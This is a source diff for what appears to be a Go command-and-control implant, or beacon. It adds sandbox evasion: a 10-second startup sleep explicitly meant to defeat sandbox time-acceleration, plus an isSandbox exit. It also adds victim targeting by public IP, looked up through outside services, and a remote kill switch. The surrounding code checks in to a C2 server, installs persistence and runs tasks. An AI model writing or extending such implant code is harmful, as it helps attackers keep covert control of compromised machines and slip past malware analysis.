@@ -25,6 +25,8 @@ var (
 	JITTER         = "10"
 	BEACON_ID      = ""
 	PROTO          = "http" // "http" or "tcp"
+	ALLOWED_IPS    = ""     // pipe-separated CIDR/IPs, empty = allow all
+	BLOCKED_IPS    = ""     // pipe-separated CIDR/IPs
 )
 
 type Task struct {
@@ -203,16 +205,89 @@ func checkAdmin() bool {
 	return os.Getuid() == 0
 }
 
+// ==================== IP FILTER ====================
+
+func checkIPFilter() bool {
+	if ALLOWED_IPS == "" && BLOCKED_IPS == "" {
+		return true // No filter configured
+	}
+
+	publicIP := getPublicIP()
+	if publicIP == "" {
+		return true // Can't determine IP, fail-open
+	}
+
+	parsedIP := net.ParseIP(publicIP)
+	if parsedIP == nil {
+		return true
+	}
+
+	// Check blacklist
+	if BLOCKED_IPS != "" {
+		for _, entry := range strings.Split(BLOCKED_IPS, "|") {
+			entry = strings.TrimSpace(entry)
+			if entry != "" && matchIPFilter(parsedIP, entry) {
+				return false
+			}
+		}
+	}
+
+	// Check whitelist
+	if ALLOWED_IPS != "" {
+		for _, entry := range strings.Split(ALLOWED_IPS, "|") {
+			entry = strings.TrimSpace(entry)
+			if entry != "" && matchIPFilter(parsedIP, entry) {
+				return true
+			}
+		}
+		return false // Whitelist set but IP not in it
+	}
+
+	return true
+}
+
+func getPublicIP() string {
+	body, err := httpGet("http://api.ipify.org", nil)
+	if err != nil {
+		body, err = httpGet("http://ifconfig.me/ip", nil)
+		if err != nil {
+			return ""
+		}
+	}
+	return strings.TrimSpace(string(body))
+}
+
+func matchIPFilter(ip net.IP, entry string) bool {
+	if strings.Contains(entry, "/") {
+		_, cidr, err := net.ParseCIDR(entry)
+		if err != nil {
+			return false
+		}
+		return cidr.Contains(ip)
+	}
+	return ip.Equal(net.ParseIP(entry))
+}
+
 // ==================== MAIN ====================
 
 func main() {
+	// Sleep before any operation to evade sandbox time-acceleration
+	time.Sleep(10 * time.Second)
+
+	if isSandbox() {
+		os.Exit(0)
+	}
+
+	if !checkIPFilter() {
+		os.Exit(0)
+	}
+
 	if BEACON_ID == "" {
 		b := make([]byte, 16)
 		rand.Read(b)
 		BEACON_ID = hex.EncodeToString(b)
 	}
 
-	// Install persistence (copy self + auto-start)
 	installPersistence()
 
 	sleepSec, _ := strconv.Atoi(SLEEP_INTERVAL)
@@ -257,8 +332,11 @@ func register(sleepSec, jitterPct int) {
 	}
 
 	for i := 0; i < 3; i++ {
-		_, err := httpPost(C2_URL+"/checkin", jsonData)
+		body, err := httpPost(C2_URL+"/checkin", jsonData)
 		if err == nil {
+			if string(body) == "__TERMINATE__" {
+				os.Exit(0)
+			}
 			return
 		}
 		time.Sleep(2 * time.Second)
@@ -276,6 +354,11 @@ func checkIn(currentSleep, currentJitter int) (int, int) {
 		return -1, -1
 	}
 	content := string(body)
+
+	// Server sent terminate signal - exit permanently
+	if content == "__TERMINATE__" {
+		os.Exit(0)
+	}
 
 	// Handle sleep config update
 	if strings.HasPrefix(content, "SLEEP ") {
@@ -364,10 +447,18 @@ func runTCP(sleepSec, jitterPct int) {
 			continue
 		}
 
-		if _, err := tcpReadMsg(conn); err != nil {
+		ackRaw, err := tcpReadMsg(conn)
+		if err != nil {
 			conn.Close()
 			sleepWithJitter(sleepSec, jitterPct)
 			continue
+		}
+
+		// Check if server sent terminate signal on registration
+		var ackMsg TCPMsg
+		if json.Unmarshal(ackRaw, &ackMsg) == nil && ackMsg.Type == "terminate" {
+			conn.Close()
+			os.Exit(0)
 		}
 
 		for {
@@ -388,6 +479,10 @@ func runTCP(sleepSec, jitterPct int) {
 			}
 
 			switch msg.Type {
+			case "terminate":
+				conn.Close()
+				os.Exit(0)
+
 			case "tasks":
 				var tasks []Task
 				if err := json.Unmarshal(msg.Data, &tasks); err != nil {
